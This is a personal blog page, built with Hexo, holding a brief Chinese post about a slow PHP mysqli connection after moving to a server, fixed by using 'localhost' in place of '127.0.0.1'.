    
    <div class="article-entry" itemprop="articleBody">
      
        <p>title:PHP mysqli连接特别慢的情况解决<br>date:2016-03-21 08:19:01<br>今天将自己做的一个quiz程序迁移到了服务器上，但是出乎意料的慢，经过代码定位发现是慢在mysqli的创建和连接上。</p>
<p>解决方案是：将IP地址中的『127.0.0.1』改为『localhost』</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/03/26/PHP mysqli连接特别慢的情况解决/" data-id="cj0ryfu9p000tc6otdrv8e22r" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
    </nav>
  
</section>
        
          <aside id="sidebar">
  
    
  
    
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a><span class="archive-list-count">173</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2017/03/26/c++ std::random_shuffle()实现/">(no title)</a>
          </li>
        
          <li>
            <a href="/2017/03/26/About/">(no title)</a>
          </li>
        
          <li>
            <a href="/2017/03/26/Ajax模板/">(no title)</a>
          </li>
        
          <li>
            <a href="/2017/03/26/Bing背景图片API/">(no title)</a>
          </li>
        
          <li>
            <a href="/2017/03/26/Django教程：创建投票App Part 2/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2017 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>